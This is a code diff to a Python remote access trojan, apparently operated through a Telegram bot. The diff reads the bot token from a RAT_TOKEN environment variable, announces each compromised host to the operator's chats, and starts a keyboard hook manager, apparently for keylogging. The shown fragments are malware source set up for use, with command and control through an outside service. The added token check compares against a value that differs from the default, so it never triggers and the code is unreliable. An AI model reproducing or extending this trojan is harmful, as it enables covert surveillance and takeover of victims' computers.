@@ -35,7 +35,7 @@ from ctypes import * #fixing pyinstaller - we need to import all the ctypes to g
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = 'xx:xxx' # you can set your environment variable as well
+token = os.environ['RAT_TOKEN'] if 'RAT_TOKEN' in os.environ else 'xx:xxx' # you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'xx'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
@@ -630,12 +630,12 @@ def handle(msg):
                         responses = split_string(4096, response)
                         for resp in responses:
                                 send_safe_message(bot, chat_id, resp)#
+if token == 'xx:xx': raise Exception('Token not set')
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
 	helloWorld = platform.uname()[1] + ": I'm up."
-	for known_id in known_ids:
-		send_safe_message(bot, known_id, helloWorld)
+	for known_id in known_ids: send_safe_message(bot, known_id, helloWorld)
 	print(helloWorld)
 print('Listening for commands on ' + platform.uname()[1] + '...')
 hookManager = pyHook.HookManager()
